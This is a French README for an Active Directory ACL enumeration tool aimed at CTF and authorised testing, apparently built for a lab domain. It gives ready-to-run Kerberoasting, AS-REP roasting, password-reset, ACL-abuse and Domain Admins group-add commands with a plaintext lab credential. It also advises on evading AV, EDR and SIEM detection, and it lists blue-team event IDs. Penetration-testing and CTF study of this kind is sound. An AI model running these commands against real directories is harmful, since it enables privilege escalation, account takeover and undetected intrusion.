# AD ACL Enumeration Tool

**⚠️ Pour utilisation en CTF et tests autorisés uniquement ⚠️**

## Description

Outil d'énumération Active Directory pour identifier les permissions exploitables, les configurations dangereuses et les chemins d'escalade de privilèges dans un environnement autorisé.

## Installation

```bash
# Installer les dépendances
pip3 install -r requirements.txt

# Rendre le script exécutable
chmod +x ad_acl_enum.py
```

## Utilisation

### Énumération basique
```bash
python3 ad_acl_enum.py -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -dc 10.129.2.171
```

### Énumération d'un utilisateur spécifique
```bash
python3 ad_acl_enum.py -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -dc 10.129.2.171 -t "N.Thompson"
```

### Avec LDAPS (plus discret)
```bash
python3 ad_acl_enum.py -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -dc 10.129.2.171 --ldaps
```

## Ce que l'outil détecte

### 1. **Permissions ACL dangereuses**
- **GenericAll** : Contrôle total sur l'objet
- **WriteDacl** : Peut modifier les permissions
- **WriteOwner** : Peut devenir propriétaire
- **WriteProperty** : Peut modifier des attributs
- **Self-Membership** : Peut s'ajouter à un groupe

### 2. **Utilisateurs Kerberoastables**
Utilisateurs avec un SPN configuré → vulnérables à Kerberoasting
```bash
# Après détection, exploiter avec:
GetUserSPNs.py delegate.vl/A.Briggs:'P4ssw0rd1#123' -dc-ip 10.129.2.171 -request
```

### 3. **Utilisateurs AS-REP Roastables**
Comptes avec DONT_REQUIRE_PREAUTH → vulnérables à AS-REP Roasting
```bash
# Exploiter avec:
GetNPUsers.py delegate.vl/ -dc-ip 10.129.2.171 -usersfile users.txt -format hashcat
```

### 4. **Délégations dangereuses**
- **Unconstrained Delegation** : Machine peut usurper n'importe quel utilisateur
- **Constrained Delegation** : Peut usurper vers services spécifiques

### 5. **Groupes à privilèges élevés**
- Domain Admins
- Enterprise Admins
- Account Operators
- Backup Operators
- etc.

## Techniques d'exploitation post-énumération

### Si vous trouvez GenericAll sur un utilisateur :

```bash
# Changer le mot de passe
net rpc password "N.Thompson" "NewPass123!" -U "delegate.vl"/"A.Briggs"%"P4ssw0rd1#123" -S 10.129.2.171

# Ou avec PowerView
Set-DomainUserPassword -Identity N.Thompson -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

### Si vous trouvez WriteDacl :

```bash
# Ajouter GenericAll pour vous-même
Add-DomainObjectAcl -TargetIdentity "N.Thompson" -PrincipalIdentity "A.Briggs" -Rights All

# Puis exploiter comme ci-dessus
```

### Si vous trouvez WriteOwner :

```bash
# Devenir propriétaire
Set-DomainObjectOwner -Identity "N.Thompson" -OwnerIdentity "A.Briggs"

# Puis s'accorder tous les droits
Add-DomainObjectAcl -TargetIdentity "N.Thompson" -PrincipalIdentity "A.Briggs" -Rights All
```

### Si vous trouvez Self-Membership sur un groupe :

```bash
# S'ajouter au groupe
net rpc group addmem "Domain Admins" "A.Briggs" -U "delegate.vl"/"A.Briggs"%"P4ssw0rd1#123" -S 10.129.2.171

# Ou avec PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'A.Briggs'
```

## Rester discret (OPSEC)

### 1. Utiliser LDAPS (chiffré)
```bash
--ldaps  # Utilise le port 636 au lieu de 389
```

### 2. Limiter les requêtes
```bash
-t "UserSpecifique"  # Cibler un seul utilisateur
```

### 3. Espacer les requêtes
Ajoutez des délais entre les requêtes pour éviter la détection :
```python
import time
time.sleep(random.uniform(1, 3))  # Entre chaque requête
```

### 4. Utiliser un proxy/tunnel
```bash
# Via SSH tunnel
ssh -L 389:dc.delegate.vl:389 user@pivot
ssh -L 636:dc.delegate.vl:636 user@pivot

# Puis cibler localhost
python3 ad_acl_enum.py -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -dc 127.0.0.1
```

## Outils complémentaires recommandés

### Énumération approfondie
- **BloodHound** : Visualisation des chemins d'attaque
  ```bash
  bloodhound-python -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -ns 10.129.2.171 -c All
  ```

- **ldapdomaindump** : Dump complet LDAP
  ```bash
  ldapdomaindump -u 'delegate.vl\A.Briggs' -p 'P4ssw0rd1#123' 10.129.2.171
  ```

### Exploitation
- **Impacket Suite** : Collection d'outils AD
  - GetUserSPNs.py (Kerberoasting)
  - GetNPUsers.py (AS-REP Roasting)
  - secretsdump.py (Extraction de secrets)
  - psexec.py (Exécution à distance)

- **PowerView** : Module PowerShell pour énumération AD
  ```powershell
  Import-Module PowerView.ps1
  Get-DomainUser -Identity N.Thompson
  Find-InterestingDomainAcl -ResolveGUIDs
  ```

- **CrackMapExec** : Outil tout-en-un
  ```bash
  crackmapexec ldap 10.129.2.171 -u A.Briggs -p 'P4ssw0rd1#123' --users
  crackmapexec ldap 10.129.2.171 -u A.Briggs -p 'P4ssw0rd1#123' --groups
  ```

## Chemins d'attaque courants en CTF

### 1. GenericAll → Password Reset → Accès
```
A.Briggs --GenericAll--> N.Thompson --MemberOf--> Domain Admins
```

### 2. WriteDacl → ACL Abuse → Privilege Escalation
```
A.Briggs --WriteDacl--> GroupPolicy --Apply--> Domain Controllers
```

### 3. Kerberoasting → Hash Cracking → Lateral Movement
```
A.Briggs --Enumerate--> SPNs --Request--> TGS Tickets --Crack--> Passwords
```

### 4. AS-REP Roasting → Hash Cracking → Initial Access
```
DONT_REQ_PREAUTH Users --Request--> AS-REP --Crack--> Passwords
```

## Détection de chemins d'attaque

Après énumération, utilisez BloodHound pour visualiser les chemins :

```bash
# 1. Collecter les données
bloodhound-python -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' -ns 10.129.2.171 -c All

# 2. Charger dans BloodHound GUI
neo4j start
bloodhound

# 3. Chercher des chemins
# - "Shortest Path to Domain Admins"
# - "Find Principals with DCSync Rights"
# - "Find AS-REP Roastable Users"
```

## Défenses à contourner

### Windows Defender / AV
- Obfusquer le code Python
- Utiliser des techniques de contournement AMSI
- Encoder les commandes PowerShell

### EDR (Endpoint Detection and Response)
- Limiter les appels API suspects
- Utiliser des techniques Living-off-the-Land
- Espacer les actions dans le temps

### SIEM (Security Information and Event Management)
- Minimiser le bruit des requêtes LDAP
- Utiliser des comptes légitimes
- Éviter les patterns d'attaque connus

## Logs à surveiller (pour Blue Team)

- **Event ID 4662** : Accès aux propriétés d'un objet AD
- **Event ID 4768/4769** : Requêtes TGT/TGS Kerberos
- **Event ID 4738** : Changement de compte utilisateur
- **Event ID 5136** : Modification d'objet dans l'annuaire

## Références

- [MITRE ATT&CK - Active Directory](https://attack.mitre.org/)
- [ired.team - AD Attacks](https://www.ired.team/)
- [HackTricks - Active Directory](https://book.hacktricks.xyz/)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)

## Disclaimer

Cet outil est destiné uniquement à être utilisé dans des environnements CTF et des tests de pénétration autorisés. L'utilisation non autorisée sur des systèmes que vous ne possédez pas ou pour lesquels vous n'avez pas l'autorisation explicite est illégale.

## License

MIT License - Usage éducatif et CTF uniquement
